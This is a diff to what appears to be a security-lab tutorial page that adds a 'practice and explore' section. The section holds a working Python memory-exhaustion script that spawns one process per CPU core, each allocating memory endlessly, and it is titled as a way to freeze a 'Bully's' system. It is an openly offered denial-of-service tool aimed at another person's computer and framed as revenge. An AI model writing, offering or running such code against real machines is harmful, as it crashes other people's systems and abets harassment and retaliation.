@@ -215,4 +215,26 @@ Actually go back to the Kali machine to see if you received a notification
 <div style="text-align: center;">
 <iframe width="560" height="315" src="https://www.youtube.com/embed/GjSZiXmqwpk?si=5r7Xp5Xi1ATsH0eM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
 </div>
-    
+
+---
+# Part 5: practice and explore
+
+Memory Hog (Consumes RAM Until the Bully’s System Freezes)
+
+``` python
+#!/usr/bin/env python3
+import multiprocessing
+import time
+
+def memory_hog():
+    """Consumes system memory indefinitely."""
+    data = []
+    while True:
+        data.append("X" * 10**6)  # Allocate 1MB per loop
+        time.sleep(0.5)
+
+if __name__ == "__main__":
+    for _ in range(multiprocessing.cpu_count()):
+        p = multiprocessing.Process(target=memory_hog)
+        p.start()
+```
